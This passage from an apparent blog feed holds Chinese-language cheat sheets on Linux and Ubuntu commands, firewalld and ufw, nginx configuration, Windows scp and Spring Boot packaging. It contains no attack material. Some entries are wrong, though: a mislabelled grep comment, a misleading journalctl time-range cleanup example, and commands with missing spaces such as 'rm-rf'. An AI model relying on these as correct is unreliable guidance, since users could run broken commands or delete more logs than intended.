<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="防火墙命令"><a href="#防火墙命令" class="headerlink" title="防火墙命令"></a>防火墙命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 管理防火墙启动、重启、状态、关闭</span><br><span class="line">systemctl start|restart|status|stop firewalld</span><br><span class="line"># 开机启动防火墙</span><br><span class="line">systemctl enable firewalld</span><br><span class="line"># 禁用防火墙</span><br><span class="line">systemctl disable firewalld</span><br><span class="line"># 重新加载防火墙规则</span><br><span class="line">systemctl reload firewalld</span><br><span class="line"></span><br><span class="line"># 查看当前安装版本</span><br><span class="line">firewall-cmd --version</span><br><span class="line"># 查看防火墙状态</span><br><span class="line">firewall-cmd --state</span><br><span class="line"># 列出防火墙所有规则列表</span><br><span class="line">firewall-cmd --zone=public --list-all</span><br><span class="line"># 列出允许通过防火墙端口列表</span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line"># 添加临时放行端口，重启防火墙后时效</span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp</span><br><span class="line"># 添加永久放行端口，重启防火墙依旧有效</span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line"># 添加永久放行端口段，此例代表8080-8900之间的端口都会放行</span><br><span class="line">firewall-cmd --zone=public --add-port=8080-8900/tcp --permanent</span><br><span class="line"># 查询端口放行状态，如果存在则返回端口信息，否则不显示</span><br><span class="line">firewall-cmd --zone=public --query-port=80/tcp</span><br><span class="line"># 永久删除放行端口</span><br><span class="line">firewall-cmd --zone=public --remove-port=80/tcp --permanent</span><br><span class="line"># 重新加载防火墙规则</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux笔记</title>
    <url>/cnblogs.github.io/2025/01/25/operations/linux/Linux%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><h4 id="journalctl"><a href="#journalctl" class="headerlink" title="journalctl"></a>journalctl</h4><h5 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 清理指定日期之前的日志</span><br><span class="line">journalctl --vacuum-time=2024-01-01</span><br><span class="line"></span><br><span class="line"># 获取 2024-01-01 的时间戳（示例时间戳为 1704076800，实际需根据系统获取）</span><br><span class="line">start_timestamp=1704076800</span><br><span class="line"># 获取 2024-01-10 的时间戳（示例时间戳为 1704940800，实际需根据系统获取）</span><br><span class="line">end_timestamp=1704940800</span><br><span class="line"># 清理指定时间段的日志 --vacuum-size=1 表示将删除符合时间范围的日志，最后的 1 是一个占位符，因为 --vacuum-size 需要一个参数来指定清理后的日志大小限制，但这里我们主要关注时间范围清理，所以设置为 1 表示不考虑大小限制进行清理</span><br><span class="line">journalctl --since=&quot;@$start_timestamp&quot; --until=&quot;@$end_timestamp&quot; --vacuum-size=1</span><br><span class="line"></span><br><span class="line"># 按日志大小清理日志</span><br><span class="line">journalctl --vacuum-size=1G</span><br><span class="line"></span><br><span class="line"># 清理 httpd 服务的日志</span><br><span class="line">journalctl --unit=httpd --vacuum-size=1G</span><br><span class="line"></span><br><span class="line"># 执行的清理操作的详细信息，但不会真正删除任何日志</span><br><span class="line">journalctl --vacuum-size=1G --dry-run</span><br></pre></td></tr></table></figure>
<h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><h5 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将文件中的某个字符串替换为另一个字符串。</span><br><span class="line">sed &#x27;s/old_text/new_text/&#x27; filename</span><br><span class="line"></span><br><span class="line"># 默认情况下，sed 只替换每行中第一个匹配的字符串。如果要替换所有匹配的字符串，可以使用 g 选项</span><br><span class="line">sed &#x27;s/old_text/new_text/g&#x27; filename</span><br><span class="line"></span><br><span class="line"># 删除文件中包含特定字符串的行。</span><br><span class="line">sed &#x27;/pattern/d&#x27; filename</span><br><span class="line"></span><br><span class="line"># 删除文件中的所有空白行。</span><br><span class="line">sed &#x27;/^$/d&#x27; filename</span><br><span class="line"></span><br><span class="line"># 在第2行前插入 new_line_text。</span><br><span class="line">sed &#x27;2i\new_line_text&#x27; filename</span><br><span class="line"></span><br><span class="line"># 在第2行后插入 new_line_text。</span><br><span class="line">sed &#x27;2a\new_line_text&#x27; filename</span><br><span class="line"></span><br><span class="line"># 将第2行替换为 new_line_text。</span><br><span class="line">sed &#x27;2c\new_line_text&#x27; filename</span><br><span class="line"></span><br><span class="line"># 打印第2行。</span><br><span class="line">sed -n &#x27;2p&#x27; filename</span><br><span class="line"></span><br><span class="line"># 删除 file.txt 中的所有数字.</span><br><span class="line">sed &#x27;s/[0-9]*//g&#x27; file.txt</span><br><span class="line"></span><br><span class="line"># 默认情况下，sed 不会修改原文件，而是将结果输出到标准输出。如果要直接修改原文件，可以使用 -i 选项</span><br><span class="line">sed -i &#x27;s/old_text/new_text/g&#x27; filename</span><br><span class="line"></span><br><span class="line"># 使用 -i 选项时，可以指定备份文件的扩展名，以便在修改前备份原文件。</span><br><span class="line">sed -i.bak &#x27;s/old_text/new_text/g&#x27; filename</span><br><span class="line"></span><br><span class="line"># 可以一次性处理多个文件。</span><br><span class="line">sed &#x27;s/old_text/new_text/g&#x27; file1.txt file2.txt</span><br><span class="line"></span><br><span class="line"># 可以将 sed 命令写入脚本文件，然后通过 -f 选项执行。</span><br><span class="line">sed -f script.sed filename</span><br><span class="line"></span><br><span class="line"># 替换第2行到第5行中的 old_text 为 new_text。</span><br><span class="line">sed &#x27;2,5s/old_text/new_text/g&#x27; filename</span><br><span class="line"></span><br><span class="line"># 在匹配 pattern 的行的下一行中，将 old_text 替换为 new_text。</span><br><span class="line">sed &#x27;/pattern/&#123;n;s/old_text/new_text/&#125;&#x27; filename</span><br><span class="line"></span><br><span class="line"># 在脚本中使用变量时，可以使用双引号而不是单引号。</span><br><span class="line">var=&quot;new_text&quot;</span><br><span class="line">sed &quot;s/old_text/$var/g&quot; filename</span><br></pre></td></tr></table></figure>
<h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><h5 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搜索 &quot;hello&quot;，忽略大小写</span><br><span class="line">grep &quot;hello&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 搜索 &quot;hello&quot;，忽略大小写</span><br><span class="line">grep -i &quot;hello&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 输出不包含 &quot;error&quot; 的行</span><br><span class="line">grep -v &quot;error&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 搜索 &quot;error&quot; 并显示行号</span><br><span class="line">grep -n &quot;error&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 统计包含 &quot;warning&quot; 的行数</span><br><span class="line">grep -c &quot;warning&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 递归搜索目录中所有文件，查找 &quot;main&quot;</span><br><span class="line">grep -r &quot;main&quot; /path/to/directory</span><br><span class="line"></span><br><span class="line"># 搜索单词 &quot;test&quot;（不会匹配 &quot;testing&quot; 或 &quot;mytest&quot;）</span><br><span class="line">grep -w &quot;test&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 搜索 &quot;error&quot; 或 &quot;warning&quot;</span><br><span class="line">grep -E &quot;error|warning&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 高亮显示匹配的 &quot;error&quot;</span><br><span class="line">grep --color &quot;error&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 显示匹配行及其前后 2 行</span><br><span class="line">grep -C 2 &quot;error&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 只显示包含 &quot;error&quot; 的文件名</span><br><span class="line">grep -l &quot;error&quot; *.log</span><br><span class="line"></span><br><span class="line"># 从管道中读取数据并搜索</span><br><span class="line">cat file.txt | grep &quot;hello&quot;</span><br><span class="line"></span><br><span class="line"># 搜索以 &quot;start&quot; 开头的行</span><br><span class="line">grep &quot;^start&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 搜索以 &quot;end&quot; 结尾的行</span><br><span class="line">grep &quot;end$&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 搜索包含 &quot;error&quot; 或 &quot;warning&quot; 的行</span><br><span class="line">grep -E &quot;error|warning&quot; file.txt</span><br><span class="line"></span><br><span class="line"># 搜索包含数字的行</span><br><span class="line">grep &quot;[0-9]&quot; file.txt</span><br></pre></td></tr></table></figure>
<h5 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找所有 .log 文件并搜索 &quot;error&quot;</span><br><span class="line">find /path/to/directory -name &quot;*.log&quot; -exec grep &quot;error&quot; &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"># 查找所有 .txt 文件并搜索 &quot;hello&quot;</span><br><span class="line">find /path/to/directory -name &quot;*.txt&quot; | xargs grep &quot;hello&quot;</span><br><span class="line"></span><br><span class="line"># 搜索 &quot;error&quot;，但排除 .bak 文件</span><br><span class="line">grep -r &quot;error&quot; --exclude=&quot;*.bak&quot; /path/to/directory</span><br><span class="line"></span><br><span class="line"># 在二进制文件中搜索字符串</span><br><span class="line">grep -a &quot;string&quot; binaryfile</span><br></pre></td></tr></table></figure>
<h4 id="通道符（-）"><a href="#通道符（-）" class="headerlink" title="通道符（|）"></a>通道符（|）</h4><h5 id="基本用法-3"><a href="#基本用法-3" class="headerlink" title="基本用法"></a>基本用法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 统计文件行数</span><br><span class="line">cat file.txt | wc -l</span><br><span class="line"></span><br><span class="line"># 查找特定进程</span><br><span class="line">ps aux | grep nginx</span><br><span class="line"></span><br><span class="line"># 排序并去重</span><br><span class="line">sort file.txt | uniq</span><br><span class="line"></span><br><span class="line"># 分页查看长输出</span><br><span class="line">ls -l /usr/bin | less</span><br><span class="line"></span><br><span class="line"># 统计单词频率</span><br><span class="line">cat file.txt | tr &#x27; &#x27; &#x27;\n&#x27; | sort | uniq -c | sort -nr</span><br><span class="line"></span><br><span class="line"># 查找大文件</span><br><span class="line">find /var/log -type f -size +100M | xargs ls -lh</span><br><span class="line"></span><br><span class="line"># 压缩日志文件</span><br><span class="line">cat access.log | gzip &gt; access.log.gz</span><br><span class="line"></span><br><span class="line"># 实时监控日志</span><br><span class="line">tail -f /var/log/syslog | grep error</span><br><span class="line"></span><br><span class="line"># 计算目录大小</span><br><span class="line">du -sh /home | cut -f1</span><br><span class="line"></span><br><span class="line"># 批量重命名文件</span><br><span class="line">ls *.txt | sed &#x27;s/\(.*\)\.txt/mv &amp; \1.doc/&#x27; | sh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu笔记</title>
    <url>/cnblogs.github.io/2025/01/11/operations/linux/Ubuntu%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><h5 id="常规命令"><a href="#常规命令" class="headerlink" title="常规命令"></a>常规命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 列出已安装的内核</span><br><span class="line">dpkg --list | grep linux-image</span><br><span class="line">## 删除一个特定的内核版本</span><br><span class="line">sudo apt-get remove --purge linux-image-&lt;version&gt;</span><br><span class="line"></span><br><span class="line">## 清理其他缓存文件</span><br><span class="line">rm-rf ~/.cache/*</span><br><span class="line"></span><br><span class="line">## 清理未使用的包文件</span><br><span class="line">sudo apt-get clean</span><br><span class="line">## 清理已安装包的无用依赖项</span><br><span class="line">sudo apt-get autoremove</span><br><span class="line">## 删除过期的包</span><br><span class="line">sudo apt-get autoclean</span><br><span class="line">## 清理日志文件 （删除超过 7 天的日志文件）</span><br><span class="line">sudo journalctl --vacuum-time=7d</span><br></pre></td></tr></table></figure>

<h5 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 编辑工具</span><br><span class="line">sudo apt install vim</span><br><span class="line">## 网络工具</span><br><span class="line">sudo apt install iputils-ping</span><br><span class="line">sudo apt install telnet telnetd openbsd-inetd</span><br><span class="line">sudo apt-get install dnsutils</span><br><span class="line">sudo apt-get install net-tools</span><br><span class="line">sudo apt-get install lrzsz</span><br><span class="line">## 常用工具</span><br><span class="line">sudo apt-get install zip</span><br></pre></td></tr></table></figure>

<h5 id="排查问题命令"><a href="#排查问题命令" class="headerlink" title="排查问题命令"></a>排查问题命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 排查端口占用情况</span><br><span class="line">sudo netstat -tlnp | grep 30001</span><br><span class="line">## du查找大文件</span><br><span class="line">du-ah / |sort-rh |head-n 10</span><br></pre></td></tr></table></figure>

<h5 id="防火墙命令"><a href="#防火墙命令" class="headerlink" title="防火墙命令"></a>防火墙命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装ufw</span><br><span class="line">sudo apt install ufw -y</span><br><span class="line">## 开启防火墙</span><br><span class="line">sudo ufw enable</span><br><span class="line">## 关闭防火墙</span><br><span class="line">sudo ufw disable </span><br><span class="line">## 开启设置的默认策略</span><br><span class="line">sudo ufw default allow</span><br><span class="line">## 查看防火墙状态</span><br><span class="line">sudo ufw status</span><br><span class="line">## 开启端口</span><br><span class="line">sudo ufw allow 22</span><br><span class="line">## 删除规则</span><br><span class="line">sudo ufw delete allow 22</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx笔记</title>
    <url>/cnblogs.github.io/2025/01/10/operations/nginx/nginx%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="常规配置"><a href="#常规配置" class="headerlink" title="常规配置"></a>常规配置</h3><h4 id="基础-HTTP-服务配置"><a href="#基础-HTTP-服务配置" class="headerlink" title="基础 HTTP 服务配置"></a>基础 HTTP 服务配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;                  # 监听 80 端口（HTTP）</span><br><span class="line">    server_name example.com;    # 域名或 IP</span><br><span class="line">    root /var/www/html;         # 静态文件根目录</span><br><span class="line">    index index.html index.htm; # 默认索引文件</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ =404; # 优先匹配文件，再匹配目录，否则返回 404</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="反向代理配置"><a href="#反向代理配置" class="headerlink" title="反向代理配置"></a>反向代理配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name example.com;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://localhost:3000;  # 将请求转发到本地的 3000 端口（如 Node.js 应用）</span><br><span class="line">        proxy_set_header Host $host;       # 传递原始请求头</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    upstream backend &#123;          # 定义后端服务器组</span><br><span class="line">        server 10.0.0.1:80 weight=3;  # 权重 3（更高优先级）</span><br><span class="line">        server 10.0.0.2:80;</span><br><span class="line">        server 10.0.0.3:80 backup;    # 备用服务器（当其他服务器宕机时启用）</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name example.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://backend;  # 请求转发到后端组</span><br><span class="line">            # 可选负载均衡算法：轮询（默认）、weight、ip_hash（会话保持）、least_conn（最少连接）等</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="SSL-配置（HTTPS）"><a href="#SSL-配置（HTTPS）" class="headerlink" title="SSL 配置（HTTPS）"></a>SSL 配置（HTTPS）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name example.com;</span><br><span class="line"></span><br><span class="line">    ssl_certificate /etc/nginx/ssl/example.com.crt;    # SSL 证书路径</span><br><span class="line">    ssl_certificate_key /etc/nginx/ssl/example.com.key; # 私钥路径</span><br><span class="line"></span><br><span class="line">    # 推荐 SSL 协议和加密套件</span><br><span class="line">    ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /var/www/html;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 强制 HTTP 跳转到 HTTPS</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name example.com;</span><br><span class="line">    return 301 https://$host$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="静态文件缓存优化"><a href="#静态文件缓存优化" class="headerlink" title="静态文件缓存优化"></a>静态文件缓存优化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ &#123;</span><br><span class="line">        expires 7d;          # 客户端缓存 7 天</span><br><span class="line">        add_header Cache-Control &quot;public&quot;;</span><br><span class="line">        access_log off;      # 可选：关闭此类请求的日志</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="重定向与重写规则"><a href="#重定向与重写规则" class="headerlink" title="重定向与重写规则"></a>重定向与重写规则</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 301 永久重定向</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name old-domain.com;</span><br><span class="line">    return 301 https://new-domain.com$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># URL 重写（如隐藏 .php 扩展）</span><br><span class="line">server &#123;</span><br><span class="line">    location / &#123;</span><br><span class="line">        rewrite ^/user/(\d+) /user.php?id=$1 last; # 将 /user/123 重写为 /user.php?id=123</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 限制 IP 访问</span><br><span class="line">location /admin &#123;</span><br><span class="line">    allow 192.168.1.0/24;  # 允许特定 IP 段</span><br><span class="line">    deny all;               # 拒绝其他所有 IP</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 基础认证（用户名/密码）</span><br><span class="line">location /private &#123;</span><br><span class="line">    auth_basic &quot;Restricted Area&quot;;</span><br><span class="line">    auth_basic_user_file /etc/nginx/.htpasswd;  # 使用 htpasswd 生成的文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    log_format main &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                    &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                    &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log /var/log/nginx/access.log main;  # 访问日志路径及格式</span><br><span class="line">    error_log /var/log/nginx/error.log warn;    # 错误日志级别（warn、error、crit 等）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Gzip-压缩"><a href="#Gzip-压缩" class="headerlink" title="Gzip 压缩"></a>Gzip 压缩</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    gzip on;                 # 开启 Gzip</span><br><span class="line">    gzip_types text/plain text/css application/json application/javascript text/xml application/xml image/svg+xml;</span><br><span class="line">    gzip_min_length 1024;    # 最小压缩文件大小</span><br><span class="line">    gzip_comp_level 6;       # 压缩级别（1-9）</span><br><span class="line">    gzip_vary on;            # 根据请求头 Vary: Accept-Encoding 启用</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="跨域配置（CORS）"><a href="#跨域配置（CORS）" class="headerlink" title="跨域配置（CORS）"></a>跨域配置（CORS）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /api &#123;</span><br><span class="line">    add_header &#x27;Access-Control-Allow-Origin&#x27; &#x27;*&#x27;;              # 允许所有域名（生产环境建议指定域名）</span><br><span class="line">    add_header &#x27;Access-Control-Allow-Methods&#x27; &#x27;GET, POST, OPTIONS&#x27;;</span><br><span class="line">    add_header &#x27;Access-Control-Allow-Headers&#x27; &#x27;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Window笔记</title>
    <url>/cnblogs.github.io/2025/01/11/operations/window/Window%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="CMD命令详解"><a href="#CMD命令详解" class="headerlink" title="CMD命令详解"></a>CMD命令详解</h4><h5 id="SCP从linux复制文件到本地桌面"><a href="#SCP从linux复制文件到本地桌面" class="headerlink" title="SCP从linux复制文件到本地桌面"></a>SCP从linux复制文件到本地桌面</h5><p>下载的文件输入scp root@服务器ip:文件绝对路径（如scp <a href="mailto:&#114;&#111;&#111;&#x74;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#56;&#x2e;&#x31;&#x33;&#x32;">&#114;&#111;&#111;&#x74;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#56;&#x2e;&#x31;&#x33;&#x32;</a>:&#x2F;root&#x2F;test002） .&#x2F;Desktop，然后回车输入服务器密码。上传本地桌面文件到服务器,输入scp Desk\文件路径 root@服务器ip:文件绝对路径（如scp Desktop\test003.txt <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#x2e;&#56;&#46;&#x31;&#51;&#x32;">&#x72;&#x6f;&#111;&#116;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#x2e;&#56;&#46;&#x31;&#51;&#x32;</a>:&#x2F;root&#x2F;） 然后回车输入服务器密码</p>
<h4 id="软件推荐"><a href="#软件推荐" class="headerlink" title="软件推荐"></a>软件推荐</h4><p>硬件检测-Hwinfo   <a href="https://sourceforge.net/projects/hwinfo/">下载地址</a><br>SqlServer转Mysql工具-Mss2sql <a href="http://files.cnblogs.com/andrew-blog/mss2sql.rar">下载地址</a></p>
]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>Window</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot笔记</title>
    <url>/cnblogs.github.io/2025/01/18/backEnd/java/Spring%20Boot/SpringBoot%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="SpringBoot多种生产打包方式"><a href="#SpringBoot多种生产打包方式" class="headerlink" title="SpringBoot多种生产打包方式"></a>SpringBoot多种生产打包方式</h4><h5 id="方法一-插件spring-boot-maven-plugin"><a href="#方法一-插件spring-boot-maven-plugin" class="headerlink" title="方法一 插件spring-boot-maven-plugin"></a>方法一 插件spring-boot-maven-plugin</h5><ul>
<li>项目应用的配置文件排除 统一打包到config目录下<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;resources&gt;</span><br><span class="line">  &lt;resource&gt;</span><br><span class="line">      &lt;directory&gt;src/main/resources&lt;/directory&gt;</span><br><span class="line">       &lt;!--filerting设置为true,则打包过程中会对这些文件进行过滤处理--&gt;</span><br><span class="line">       &lt;filtering&gt;true&lt;/filtering&gt;</span><br><span class="line">       &lt;!--指定目标路径为config--&gt;</span><br><span class="line">      &lt;targetPath&gt;$&#123;project.build.directory&#125;/config&lt;/targetPath&gt;</span><br><span class="line">      &lt;includes&gt;</span><br><span class="line">      &lt;!--使用通配符--&gt;</span><br><span class="line">         &lt;include&gt;**/*.properties&lt;/include&gt;</span><br><span class="line">         &lt;include&gt;**/*.yml&lt;/include&gt;</span><br><span class="line">         &lt;include&gt;**/*.xml&lt;/include&gt;</span><br><span class="line">     &lt;include&gt;mapper/*.xml&lt;/include&gt;</span><br><span class="line">      &lt;!-- 这里可以根据你实际想要包含的配置文件类型来添加更多的include配置 --&gt;</span><br><span class="line">   &lt;/includes&gt;</span><br><span class="line">  &lt;/resource&gt;</span><br><span class="line">&lt;/resources&gt;</span><br></pre></td></tr></table></figure></li>
<li>把我们写代码打包可执行jar，并排除依赖jar包<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">  &lt;configuration&gt;</span><br><span class="line">   &lt;!--项目的启动类,如果有多个main就必须指定，没有可以缺失</span><br><span class="line">     &lt;mainClass&gt;XXXXX.TwinWebApplication&lt;/mainClass&gt;--&gt;</span><br><span class="line">    &lt;!--解决windows命令行窗口中文乱码--&gt;</span><br><span class="line">     &lt;jvmArguments&gt;-Dfile.encoding=UTF-8&lt;/jvmArguments&gt;</span><br><span class="line">     &lt;layout&gt;ZIP&lt;/layout&gt;</span><br><span class="line">     &lt;!--配置需要打包进项目的jar--&gt;</span><br><span class="line">     &lt;includes&gt;</span><br><span class="line">     &lt;!--填写需要打包所需要的依赖 。没有匹配上任何jar包机排除依赖--&gt;</span><br><span class="line">        &lt;include&gt;</span><br><span class="line">             &lt;groupId&gt;no-exists-jar&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;non-exists-jar&lt;/artifactId&gt;</span><br><span class="line">         &lt;/include&gt;</span><br><span class="line">      &lt;/includes&gt;</span><br><span class="line">  &lt;/configuration&gt;</span><br><span class="line">  &lt;executions&gt;</span><br><span class="line">    &lt;execution&gt;</span><br><span class="line">         &lt;goals&gt;</span><br><span class="line">         &lt;!-- 表示当运行mavn package打包时，使用Springboot插件打包 --&gt;</span><br><span class="line">           &lt;goal&gt;repackage&lt;/goal&gt;</span><br><span class="line">       &lt;/goals&gt;</span><br><span class="line">    &lt;/execution&gt;</span><br><span class="line">  &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></li>
<li>配置依赖的jar包 统一打包lib目录<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--此插件用于将依赖包抽出--&gt;</span><br><span class="line">&lt;plugin&gt;</span><br><span class="line">   &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;</span><br><span class="line">   &lt;executions&gt;</span><br><span class="line">   &lt;execution&gt;</span><br><span class="line">      &lt;id&gt;copy-dependencies&lt;/id&gt;</span><br><span class="line">      &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">      &lt;goals&gt;</span><br><span class="line">         &lt;goal&gt;copy-dependencies&lt;/goal&gt;</span><br><span class="line">      &lt;/goals&gt;</span><br><span class="line">     &lt;configuration&gt;</span><br><span class="line">          &lt;outputDirectory&gt;$&#123;project.build.directory&#125;/lib&lt;/outputDirectory&gt;</span><br><span class="line">          &lt;excludeTransitive&gt;false&lt;/excludeTransitive&gt;</span><br><span class="line">          &lt;stripVersion&gt;false&lt;/stripVersion&gt;</span><br><span class="line">          &lt;includeScope&gt;runtime&lt;/includeScope&gt;</span><br><span class="line">      &lt;/configuration&gt;</span><br><span class="line">    &lt;/execution&gt;</span><br><span class="line">  &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="方法二-使用maven-jar-plugin插件实现"><a href="#方法二-使用maven-jar-plugin插件实现" class="headerlink" title="方法二 使用maven-jar-plugin插件实现"></a>方法二 使用maven-jar-plugin插件实现</h5><ul>
